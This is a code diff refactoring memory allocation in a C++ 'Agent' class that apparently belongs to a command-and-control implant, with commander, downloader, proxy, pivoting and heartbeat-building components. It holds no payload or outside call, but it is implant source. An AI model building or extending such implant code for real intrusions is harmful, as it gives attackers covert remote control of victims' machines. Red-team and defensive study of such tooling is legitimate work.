@@ -4,31 +4,25 @@
 #include "Packer.h"
 #include "Crypt.h"
 
+void* Agent::operator new(size_t sz) {
+	void* p = MemAllocLocal(sz);
+	return p;
+}
+
+void Agent::operator delete(void* p) noexcept {
+	MemFreeLocal(&p, sizeof(Agent));
+}
+
 Agent::Agent()
 {
-	info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
-	*info = AgentInfo();
-	
-	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
-	*config = AgentConfig();
-
-	commander  = (Commander*) MemAllocLocal(sizeof(AgentConfig));
-	*commander = Commander(this);
-
-	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
-	*downloader = Downloader( config->download_chunk_size );
-
-	jober  = (JobsController*)MemAllocLocal(sizeof(JobsController));
-	*jober = JobsController();
-
-	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
-	*memorysaver = MemorySaver();
-
-	proxyfire  = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
-	*proxyfire = Proxyfire();
-
-	pivotter  = (Pivotter*)MemAllocLocal(sizeof(Pivotter));
-	*pivotter = Pivotter();
+	info = new AgentInfo();
+	config = new AgentConfig();
+	commander = new Commander(this);
+	downloader = new Downloader( config->download_chunk_size );
+	jober = new JobsController();
+	memorysaver = new MemorySaver();
+	proxyfire = new Proxyfire();
+	pivotter = new Pivotter();
 
 	SessionKey = (PBYTE) MemAllocLocal(16);
 	for (int i = 0; i < 16; i++)
@@ -93,8 +87,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	flag <<= 1;
 	flag += this->info->arch64;
 
-	Packer* packer = (Packer*) MemAllocLocal(sizeof(Packer));
-	*packer = Packer();
+	Packer* packer = new Packer();
 
 	packer->Pack32(this->config->agent_type);
 	packer->Pack32(this->info->agent_id);
@@ -154,7 +147,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
 
 #endif
 
-	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
+	delete packer;
 
 	*size = beat_size;
 	return beat;
